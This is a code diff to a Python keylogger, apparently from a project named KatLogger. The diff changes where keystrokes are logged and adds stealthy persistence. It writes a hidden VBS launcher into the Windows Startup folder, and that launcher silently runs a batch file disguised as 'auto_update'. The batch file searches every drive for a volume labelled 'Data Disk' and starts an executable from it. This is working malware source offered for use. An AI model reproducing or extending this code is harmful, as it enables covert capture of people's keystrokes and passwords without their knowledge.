@@ -1,9 +1,10 @@
-USB_rappresentation_letter = "K:\\"
+LABEL = "Data Disk"
 
 import kat
 
 kat.authors("@Lif28, @rickyfili10")
 kat.licence("GPL-3.0 licence")
+kat.licenceFile("../LICENCE", 0)
 kat.link("https://github.com/Lif28/KatLogger/tree/main?tab=GPL-3.0-1-ov-file")
 kat.web("nothing for now :/")
 
@@ -23,7 +24,7 @@ class Keylogger:
 
     def send_data(self, keystrike):
         self.logger += keystrike
-        with open(f"{USB_rappresentation_letter}log.txt","a+",encoding="utf-8") as new_file:
+        with open(f"log.txt","a+",encoding="utf-8") as new_file:
             new_file.write(self.logger)
 
         self.logger = ""
@@ -58,12 +59,19 @@ class Keylogger:
     def change_dir(self):
         try:
             username = getpass.getuser()
-            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\auto_update.bat', 'w') as file:
+            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\auto_update.vbs', 'w') as VBSfile:
+                VBSfile.write(f"""
+Set WshShell = CreateObject("WScript.Shell") 
+WshShell.Run chr(34) & "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\auto_update.bat" & Chr(34), 0
+Set WshShell = Nothing
+""")
+            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\auto_update.bat', 'w') as file:
             # Write content to the file
-                file.write(f"""
+                file.write(fr"""
 @echo off
-if exist {USB_rappresentation_letter}auto_update.exe (
-    start {USB_rappresentation_letter}auto_update.exe
+For %G In (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) Do Vol %G: 2>NUL | %SystemRoot%\System32\find.exe /I "{LABEL}" > NUL && CD /D %G:\                           
+if exist auto_update.exe (
+    start auto_update.exe
 ) else (
     exit
 )
